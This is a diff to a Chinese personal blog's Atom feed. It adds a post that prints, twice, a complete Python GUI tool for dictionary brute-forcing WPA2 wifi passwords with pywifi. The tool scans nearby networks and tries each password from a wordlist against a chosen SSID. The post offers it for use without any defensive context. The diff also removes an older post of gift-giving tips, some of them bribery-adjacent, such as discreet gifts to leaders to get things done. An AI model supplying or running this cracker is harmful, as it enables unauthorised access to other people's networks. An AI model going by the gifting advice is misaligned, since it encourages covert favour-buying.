@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://strangepapers.github.io/</id>
     <title>strangepapers</title>
-    <updated>2023-07-30T11:04:40.442Z</updated>
+    <updated>2023-08-05T02:04:10.318Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://strangepapers.github.io/"/>
     <link rel="self" href="https://strangepapers.github.io/atom.xml"/>
@@ -11,6 +11,391 @@
     <logo>https://strangepapers.github.io/images/avatar.png</logo>
     <icon>https://strangepapers.github.io/favicon.ico</icon>
     <rights>All rights reserved 2023, strangepapers</rights>
+    <entry>
+        <title type="html"><![CDATA[python暴力破解wifi]]></title>
+        <id>https://strangepapers.github.io/post/Oz8deZ6XO/</id>
+        <link href="https://strangepapers.github.io/post/Oz8deZ6XO/">
+        </link>
+        <updated>2023-08-05T02:00:50.000Z</updated>
+        <summary type="html"><![CDATA[<p>需要pywifi</p>
+<pre><code class="language-python"># coding:utf-8
+
+from tkinter import *
+from tkinter import ttk  
+import pywifi
+from pywifi import const
+import time
+import tkinter.filedialog
+import tkinter.messagebox
+
+class MY_GUI():
+	def __init__(self,init_window_name):
+		self.init_window_name = init_window_name
+		
+		#密码文件路径
+		self.get_value = StringVar()
+		
+		#获取破解wifi账号
+		self.get_wifi_value = StringVar()
+		
+		#获取wifi密码
+		self.get_wifimm_value = StringVar()
+		
+		self.wifi = pywifi.PyWiFi()  #抓取网卡接口
+		self.iface = self.wifi.interfaces()[0] #抓取第一个无线网卡
+		self.iface.disconnect()  #测试链接断开所有链接
+		time.sleep(1)  #休眠1秒
+		#测试网卡是否属于断开状态
+		assert self.iface.status() in\
+				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
+	
+	def __str__(self):
+		return '(WIFI:%s,%s)' % (self.wifi,self.iface.name())
+		
+	#设置窗口
+	def set_init_window(self):
+		self.init_window_name.title(&quot;WIFI破解工具&quot;)
+		self.init_window_name.geometry('+500+200')
+		
+		labelframe = LabelFrame(width=400, height=200,text=&quot;配置&quot;)
+		labelframe.grid(column=0, row=0, padx=10, pady=10)
+		
+		self.search = Button(labelframe,text=&quot;搜索附近WiFi&quot;,command=self.scans_wifi_list).grid(column=0,row=0)
+		
+		self.pojie = Button(labelframe,text=&quot;开始破解&quot;,command=self.readPassWord).grid(column=1,row=0)
+		
+		self.label = Label(labelframe,text=&quot;目录路径：&quot;).grid(column=0,row=1)
+		
+		self.path = Entry(labelframe,width=12,textvariable = self.get_value).grid(column=1,row=1)
+		
+		self.file = Button(labelframe,text=&quot;添加密码文件目录&quot;,command=self.add_mm_file).grid(column=2,row=1)
+		
+		self.wifi_text = Label(labelframe,text=&quot;WiFi账号：&quot;).grid(column=0,row=2)
+		
+		self.wifi_input = Entry(labelframe,width=12,textvariable = self.get_wifi_value).grid(column=1,row=2)
+		
+		self.wifi_mm_text = Label(labelframe,text=&quot;WiFi密码：&quot;).grid(column=2,row=2)
+		
+		self.wifi_mm_input = Entry(labelframe,width=10,textvariable = self.get_wifimm_value).grid(column=3,row=2,sticky=W)
+		
+		self.wifi_labelframe = LabelFrame(text=&quot;wifi列表&quot;)
+		self.wifi_labelframe.grid(column=0, row=3,columnspan=4,sticky=NSEW)
+		
+		
+		# 定义树形结构与滚动条
+		self.wifi_tree = ttk.Treeview(self.wifi_labelframe,show=&quot;headings&quot;,columns=(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;))		
+		self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)       
+		self.wifi_tree.configure(yscrollcommand=self.vbar.set)
+		
+		# 表格的标题
+		self.wifi_tree.column(&quot;a&quot;, width=50, anchor=&quot;center&quot;)
+		self.wifi_tree.column(&quot;b&quot;, width=100, anchor=&quot;center&quot;)
+		self.wifi_tree.column(&quot;c&quot;, width=100, anchor=&quot;center&quot;)
+		self.wifi_tree.column(&quot;d&quot;, width=100, anchor=&quot;center&quot;)
+         
+		self.wifi_tree.heading(&quot;a&quot;, text=&quot;WiFiID&quot;)
+		self.wifi_tree.heading(&quot;b&quot;, text=&quot;SSID&quot;)
+		self.wifi_tree.heading(&quot;c&quot;, text=&quot;BSSID&quot;)
+		self.wifi_tree.heading(&quot;d&quot;, text=&quot;signal&quot;)
+        
+		self.wifi_tree.grid(row=4,column=0,sticky=NSEW)
+		self.wifi_tree.bind(&quot;&lt;Double-1&gt;&quot;,self.onDBClick)
+		self.vbar.grid(row=4,column=1,sticky=NS)
+		
+	#搜索wifi
+	#cmd /k C:\Python27\python.exe &quot;$(FULL_CURRENT_PATH)&quot; &amp; PAUSE &amp; EXIT
+	def scans_wifi_list(self):  # 扫描周围wifi列表
+		#开始扫描
+		print(&quot;^_^ 开始扫描附近wifi...&quot;)
+		self.iface.scan()
+		time.sleep(15)
+		#在若干秒后获取扫描结果
+		scanres = self.iface.scan_results()
+		#统计附近被发现的热点数量
+		nums = len(scanres)
+		print(&quot;数量: %s&quot;%(nums))
+		#print (&quot;| %s |  %s |  %s | %s&quot;%(&quot;WIFIID&quot;,&quot;SSID&quot;,&quot;BSSID&quot;,&quot;signal&quot;))
+		# 实际数据
+		self.show_scans_wifi_list(scanres)
+		return scanres
+	
+	#显示wifi列表
+	def show_scans_wifi_list(self,scans_res):
+		for index,wifi_info in enumerate(scans_res):
+            # print(&quot;%-*s| %s | %*s |%*s\n&quot;%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
+			self.wifi_tree.insert(&quot;&quot;,'end',values=(index + 1,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
+			#print(&quot;| %s | %s | %s | %s \n&quot;%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
+	
+	#添加密码文件目录
+	def add_mm_file(self):
+		self.filename = tkinter.filedialog.askopenfilename()
+		self.get_value.set(self.filename)
+	
+	#Treeview绑定事件
+	def onDBClick(self,event):
+		self.sels= event.widget.selection()
+		self.get_wifi_value.set(self.wifi_tree.item(self.sels,&quot;values&quot;)[1])
+		#print(&quot;you clicked on&quot;,self.wifi_tree.item(self.sels,&quot;values&quot;)[1])
+	
+	#读取密码字典，进行匹配
+	def readPassWord(self):
+		self.getFilePath = self.get_value.get()
+		#print(&quot;文件路径：%s\n&quot; %(self.getFilePath))
+		self.get_wifissid = self.get_wifi_value.get()
+		#print(&quot;ssid：%s\n&quot; %(self.get_wifissid))
+		self.pwdfilehander=open(self.getFilePath,&quot;r&quot;,errors=&quot;ignore&quot;)
+		while True:
+				try:
+					self.pwdStr =self.pwdfilehander.readline()
+					#print(&quot;密码: %s &quot; %(self.pwdStr))
+					if not self.pwdStr:
+						break
+					self.bool1=self.connect(self.pwdStr,self.get_wifissid)
+					#print(&quot;返回值：%s\n&quot; %(self.bool1) )
+					if self.bool1:
+						# print(&quot;密码正确：&quot;+pwdStr
+						# res = &quot;密码:%s 正确 \n&quot;%self.pwdStr;
+						self.res = &quot;===正确===  wifi名:%s  匹配密码：%s &quot;%(self.get_wifissid,self.pwdStr)
+						self.get_wifimm_value.set(self.pwdStr)
+						tkinter.messagebox.showinfo('提示', '破解成功！！！')
+						print(self.res)
+						break
+					else:
+						# print(&quot;密码:&quot;+self.pwdStr+&quot;错误&quot;)
+						self.res = &quot;---错误--- wifi名:%s匹配密码：%s&quot;%(self.get_wifissid,self.pwdStr)
+						print(self.res)
+					sleep(3)
+				except:
+					continue
+	
+	#对wifi和密码进行匹配
+	def connect(self,pwd_Str,wifi_ssid):
+		#创建wifi链接文件
+		self.profile = pywifi.Profile()
+		self.profile.ssid =wifi_ssid #wifi名称
+		self.profile.auth = const.AUTH_ALG_OPEN  #网卡的开放
+		self.profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
+		self.profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
+		self.profile.key = pwd_Str #密码
+		self.iface.remove_all_network_profiles() #删除所有的wifi文件
+		self.tmp_profile = self.iface.add_network_profile(self.profile)#设定新的链接文件
+		self.iface.connect(self.tmp_profile)#链接
+		time.sleep(5)
+		if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
+			isOK=True   
+		else:
+			isOK=False
+		self.iface.disconnect() #断开
+		time.sleep(1)
+		#检查断开状态
+		assert self.iface.status() in\
+				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
+		return isOK
+		
+def gui_start():
+	init_window = Tk()
+	ui = MY_GUI(init_window)
+	print(ui)
+	ui.set_init_window()
+	#ui.scans_wifi_list()
+	
+	init_window.mainloop()
+	
+gui_start()
+</code></pre>
+<p>取自github。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>需要pywifi</p>
+<pre><code class="language-python"># coding:utf-8
+
+from tkinter import *
+from tkinter import ttk  
+import pywifi
+from pywifi import const
+import time
+import tkinter.filedialog
+import tkinter.messagebox
+
+class MY_GUI():
+	def __init__(self,init_window_name):
+		self.init_window_name = init_window_name
+		
+		#密码文件路径
+		self.get_value = StringVar()
+		
+		#获取破解wifi账号
+		self.get_wifi_value = StringVar()
+		
+		#获取wifi密码
+		self.get_wifimm_value = StringVar()
+		
+		self.wifi = pywifi.PyWiFi()  #抓取网卡接口
+		self.iface = self.wifi.interfaces()[0] #抓取第一个无线网卡
+		self.iface.disconnect()  #测试链接断开所有链接
+		time.sleep(1)  #休眠1秒
+		#测试网卡是否属于断开状态
+		assert self.iface.status() in\
+				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
+	
+	def __str__(self):
+		return '(WIFI:%s,%s)' % (self.wifi,self.iface.name())
+		
+	#设置窗口
+	def set_init_window(self):
+		self.init_window_name.title(&quot;WIFI破解工具&quot;)
+		self.init_window_name.geometry('+500+200')
+		
+		labelframe = LabelFrame(width=400, height=200,text=&quot;配置&quot;)
+		labelframe.grid(column=0, row=0, padx=10, pady=10)
+		
+		self.search = Button(labelframe,text=&quot;搜索附近WiFi&quot;,command=self.scans_wifi_list).grid(column=0,row=0)
+		
+		self.pojie = Button(labelframe,text=&quot;开始破解&quot;,command=self.readPassWord).grid(column=1,row=0)
+		
+		self.label = Label(labelframe,text=&quot;目录路径：&quot;).grid(column=0,row=1)
+		
+		self.path = Entry(labelframe,width=12,textvariable = self.get_value).grid(column=1,row=1)
+		
+		self.file = Button(labelframe,text=&quot;添加密码文件目录&quot;,command=self.add_mm_file).grid(column=2,row=1)
+		
+		self.wifi_text = Label(labelframe,text=&quot;WiFi账号：&quot;).grid(column=0,row=2)
+		
+		self.wifi_input = Entry(labelframe,width=12,textvariable = self.get_wifi_value).grid(column=1,row=2)
+		
+		self.wifi_mm_text = Label(labelframe,text=&quot;WiFi密码：&quot;).grid(column=2,row=2)
+		
+		self.wifi_mm_input = Entry(labelframe,width=10,textvariable = self.get_wifimm_value).grid(column=3,row=2,sticky=W)
+		
+		self.wifi_labelframe = LabelFrame(text=&quot;wifi列表&quot;)
+		self.wifi_labelframe.grid(column=0, row=3,columnspan=4,sticky=NSEW)
+		
+		
+		# 定义树形结构与滚动条
+		self.wifi_tree = ttk.Treeview(self.wifi_labelframe,show=&quot;headings&quot;,columns=(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;))		
+		self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)       
+		self.wifi_tree.configure(yscrollcommand=self.vbar.set)
+		
+		# 表格的标题
+		self.wifi_tree.column(&quot;a&quot;, width=50, anchor=&quot;center&quot;)
+		self.wifi_tree.column(&quot;b&quot;, width=100, anchor=&quot;center&quot;)
+		self.wifi_tree.column(&quot;c&quot;, width=100, anchor=&quot;center&quot;)
+		self.wifi_tree.column(&quot;d&quot;, width=100, anchor=&quot;center&quot;)
+         
+		self.wifi_tree.heading(&quot;a&quot;, text=&quot;WiFiID&quot;)
+		self.wifi_tree.heading(&quot;b&quot;, text=&quot;SSID&quot;)
+		self.wifi_tree.heading(&quot;c&quot;, text=&quot;BSSID&quot;)
+		self.wifi_tree.heading(&quot;d&quot;, text=&quot;signal&quot;)
+        
+		self.wifi_tree.grid(row=4,column=0,sticky=NSEW)
+		self.wifi_tree.bind(&quot;&lt;Double-1&gt;&quot;,self.onDBClick)
+		self.vbar.grid(row=4,column=1,sticky=NS)
+		
+	#搜索wifi
+	#cmd /k C:\Python27\python.exe &quot;$(FULL_CURRENT_PATH)&quot; &amp; PAUSE &amp; EXIT
+	def scans_wifi_list(self):  # 扫描周围wifi列表
+		#开始扫描
+		print(&quot;^_^ 开始扫描附近wifi...&quot;)
+		self.iface.scan()
+		time.sleep(15)
+		#在若干秒后获取扫描结果
+		scanres = self.iface.scan_results()
+		#统计附近被发现的热点数量
+		nums = len(scanres)
+		print(&quot;数量: %s&quot;%(nums))
+		#print (&quot;| %s |  %s |  %s | %s&quot;%(&quot;WIFIID&quot;,&quot;SSID&quot;,&quot;BSSID&quot;,&quot;signal&quot;))
+		# 实际数据
+		self.show_scans_wifi_list(scanres)
+		return scanres
+	
+	#显示wifi列表
+	def show_scans_wifi_list(self,scans_res):
+		for index,wifi_info in enumerate(scans_res):
+            # print(&quot;%-*s| %s | %*s |%*s\n&quot;%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
+			self.wifi_tree.insert(&quot;&quot;,'end',values=(index + 1,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
+			#print(&quot;| %s | %s | %s | %s \n&quot;%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
+	
+	#添加密码文件目录
+	def add_mm_file(self):
+		self.filename = tkinter.filedialog.askopenfilename()
+		self.get_value.set(self.filename)
+	
+	#Treeview绑定事件
+	def onDBClick(self,event):
+		self.sels= event.widget.selection()
+		self.get_wifi_value.set(self.wifi_tree.item(self.sels,&quot;values&quot;)[1])
+		#print(&quot;you clicked on&quot;,self.wifi_tree.item(self.sels,&quot;values&quot;)[1])
+	
+	#读取密码字典，进行匹配
+	def readPassWord(self):
+		self.getFilePath = self.get_value.get()
+		#print(&quot;文件路径：%s\n&quot; %(self.getFilePath))
+		self.get_wifissid = self.get_wifi_value.get()
+		#print(&quot;ssid：%s\n&quot; %(self.get_wifissid))
+		self.pwdfilehander=open(self.getFilePath,&quot;r&quot;,errors=&quot;ignore&quot;)
+		while True:
+				try:
+					self.pwdStr =self.pwdfilehander.readline()
+					#print(&quot;密码: %s &quot; %(self.pwdStr))
+					if not self.pwdStr:
+						break
+					self.bool1=self.connect(self.pwdStr,self.get_wifissid)
+					#print(&quot;返回值：%s\n&quot; %(self.bool1) )
+					if self.bool1:
+						# print(&quot;密码正确：&quot;+pwdStr
+						# res = &quot;密码:%s 正确 \n&quot;%self.pwdStr;
+						self.res = &quot;===正确===  wifi名:%s  匹配密码：%s &quot;%(self.get_wifissid,self.pwdStr)
+						self.get_wifimm_value.set(self.pwdStr)
+						tkinter.messagebox.showinfo('提示', '破解成功！！！')
+						print(self.res)
+						break
+					else:
+						# print(&quot;密码:&quot;+self.pwdStr+&quot;错误&quot;)
+						self.res = &quot;---错误--- wifi名:%s匹配密码：%s&quot;%(self.get_wifissid,self.pwdStr)
+						print(self.res)
+					sleep(3)
+				except:
+					continue
+	
+	#对wifi和密码进行匹配
+	def connect(self,pwd_Str,wifi_ssid):
+		#创建wifi链接文件
+		self.profile = pywifi.Profile()
+		self.profile.ssid =wifi_ssid #wifi名称
+		self.profile.auth = const.AUTH_ALG_OPEN  #网卡的开放
+		self.profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
+		self.profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
+		self.profile.key = pwd_Str #密码
+		self.iface.remove_all_network_profiles() #删除所有的wifi文件
+		self.tmp_profile = self.iface.add_network_profile(self.profile)#设定新的链接文件
+		self.iface.connect(self.tmp_profile)#链接
+		time.sleep(5)
+		if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
+			isOK=True   
+		else:
+			isOK=False
+		self.iface.disconnect() #断开
+		time.sleep(1)
+		#检查断开状态
+		assert self.iface.status() in\
+				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
+		return isOK
+		
+def gui_start():
+	init_window = Tk()
+	ui = MY_GUI(init_window)
+	print(ui)
+	ui.set_init_window()
+	#ui.scans_wifi_list()
+	
+	init_window.mainloop()
+	
+gui_start()
+</code></pre>
+<p>取自github。</p>
+<!-- more -->
+<!-- more -->
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[WHO care us.]]></title>
         <id>https://strangepapers.github.io/post/NoftwTtC_/</id>
@@ -768,60 +1153,6 @@ github的网页加载的确很慢，这并没有办法。<br>
 </code></pre>
 <p>取自CSDN<br>
 <img src="https://i.328888.xyz/2023/01/30/8t3zc.png" alt="8t3zc.png" loading="lazy"></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[送礼潜规则]]></title>
-        <id>https://strangepapers.github.io/post/song-li-qian-gui-ze/</id>
-        <link href="https://strangepapers.github.io/post/song-li-qian-gui-ze/">
-        </link>
-        <updated>2023-01-30T08:41:34.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="说实话其实就是越贵越好">说实话，其实就是越贵越好。</h1>
-<p><a href="https://ts1.cn.mm.bing.net/th/id/R-C.7c6d93b96cf53e830a62640600477016?rik=3TuprOlGi%2bN2cQ&amp;riu=http%3a%2f%2ftu.52guzhuang.com%2fd%2ffile%2fp%2f2015-05-21%2fsbrzjsk33bt1370.jpg&amp;ehk=9NWVAfKZ9B%2bEvYu%2fFSDFwUVuNO1Wbv6NnTUhreIchhk%3d&amp;risl=&amp;pid=ImgRaw&amp;r=0"></a></p>
-<blockquote>
-<p>1、送穷亲戚，好不好的不重要，重点是要贵，要送价值明显的、他们觉得贵平时舍不得买的。比如进口的水果、包装豪华而又昂贵的点心等等。<br>
-2、送富亲戚，要送性价比比较低的，越不划算的东西越好，比如送2000多块的意大利手工伞、1000多块的羊角梳子等。<br>
-3、送领导，要送有钱也不一定能买到的好东西，比如自己老家亲戚种的有机大米，百年老店的手工制品等等，重点不在于价格有多昂贵，而在于稀缺性。<br>
-4、去朋友家吃饭送什么，送当季比较贵的菜，不仅花小钱办大事，更能拉近和朋友的关系。<br>
-5、对工作上有业务往来的伙伴送什么，男性你就送他女性用品，比如化妆品；女性有小孩的你就送她儿童用品，没小孩的你就送她老年用品，准没错。<br>
-6、新入职想要和同事打好关系，送什么？最好的答案就是下午茶，今天请喝奶茶，明天请吃鸭脖，后天请吃水果，很快你就能和同事打成一片。<br>
-7、送礼送不出去的原因无非有2个，一个是你礼品没到位，一个是人家不想帮你办。<br>
-8、真正有事时才送礼往往不灵，关键还是在于平时的点滴铺垫。<br>
-9、要送对方真正感兴趣的东西，而不是自己觉得贵重的东西。<br>
-10、送礼的关键在于让对方感受到你的态度，而不是礼品有多好。<br>
-11、礼物送出去之后切记不要再提，尤其是在有第三者在的场合。<br>
-12、你给别人送东西办事，知道的人越少越好。<br>
-13、送礼的过程要自然，不要搞得太隆重、太正式，让对方太有心理压力。<br>
-14、如果和别人不熟，最好不要一上来就送礼，这样只会让别人心生警惕。<br>
-15、别人收了你的礼，不要就觉得对方一定要帮你办成这件事。<br>
-16、送礼千万不要跟风，没有任何新意，送出去的礼物也得不到对方的重视。还不如踏踏实实了解一下人家的需求，送点实用的东西！<br>
-17、送礼送到最后，往往都是送钱，在任何地方都通用。<br>
-18、送烟酒的奥妙在于烟酒即使对方不用，也能拿去变现，其实就是变相的送钱。<br>
-19、送礼不要太频繁，太频繁了，对方也就习惯了、麻木了。<br>
-20、送礼不要扎堆，选择人少的时候送。<br>
-21、初次见面一定不要送大礼，对方会觉得你别有用心，反而不落好。<br>
-22、送礼之前要先打好感情基础，让对方觉得自己可靠、安全。<br>
-23、求人办事，送礼切记不要越级送礼。<br>
-24、领导的亲戚卖什么，咱就买什么，这是最简单自然而又高明的送礼。<br>
-25、求人办事时，送礼代表的是你愿意付出什么代价，意味着自己必须吃点亏，要不然就成了道德绑架。<br>
-26、送礼的时候不能试探性动作太多，老想着事办不成怎么办，亏了怎么办？<br>
-27、蹭同事的车，习惯性的给同事买盒烟，简单又实用。<br>
-28、求人办事要讲究礼先到，不要老想着事成之后再送礼。<br>
-29、平时出门习惯性的给门卫递根烟，往往就能减少很多麻烦。<br>
-30、学习送礼可以从见人分烟、请人吃饭、给人小恩小惠开始。<br>
-31、跟别人说一百句谢谢也不如给别人发个红包来的实在。<br>
-32、送礼不能心急，尤其是刚认识的人，搞关系是长期日积月累的事。<br>
-33、给缺钱的人送礼，要想办法满足他的物质需求；给不缺钱的人送礼，要想办法满足他的精神需求。<br>
-34、送礼一定要送对人，谁能帮你就送谁。<br>
-35、车的后备箱要随时备一些烟酒，以备不时之需。<br>
-36、送礼之前多说感恩的话，说的多了，礼自然而然就送出去了。<br>
-37、每天收入的三分之一，拿出去请客吃饭洗脚按摩，你的路就会越走越宽。<br>
-38、送礼一定要有耐心，第一次送礼人家不收也不要慌，刘备请诸葛亮还三顾茅庐呢！<br>
-39、在大领导面前不要生硬的送物质，在他面前表忠诚、立决心比送什么都管用。<br>
-40、送礼的时候，把别人托高一点，把自己放低一点，再配合物质表示，事情往往就成了。</p>
-</blockquote>
-<h2 id="啧真麻烦">啧，真麻烦。</h2>
-<h2 id="有研究这玩意的一半精力用在技术研发上也不至于现在被漂亮国人卡脖子">有研究这玩意的一半精力用在技术研发上，也不至于现在被漂亮国人卡脖子</h2>
 ]]></content>
     </entry>
 </feed>
